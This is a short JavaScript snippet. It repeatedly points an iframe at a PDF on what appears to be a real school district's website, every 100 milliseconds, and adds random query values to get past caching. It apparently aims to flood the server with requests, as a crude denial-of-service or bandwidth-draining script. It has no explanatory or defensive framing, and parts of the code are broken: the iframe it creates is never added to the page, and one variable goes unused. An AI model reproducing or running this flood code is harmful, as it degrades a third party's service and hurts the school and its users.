setInterval(function(){
var randomNumber1 = Math.floor((Math.random() * 9001) + 1);
var randomNumber2 = Math.floor((Math.random() * 9001) + 1);
var x = document.createElement("iframe");
x.setAttribute("id", "myFrame");
var y = document.getElementById("myFrame").src = "http://www.mvcsc.k12.in.us/userfiles/2/my%20files/district/2017-2018/district/2017-2018%20mvhs%20student%20handbook.pdf?id=5133?r="+randomNumber2;
}, 100);
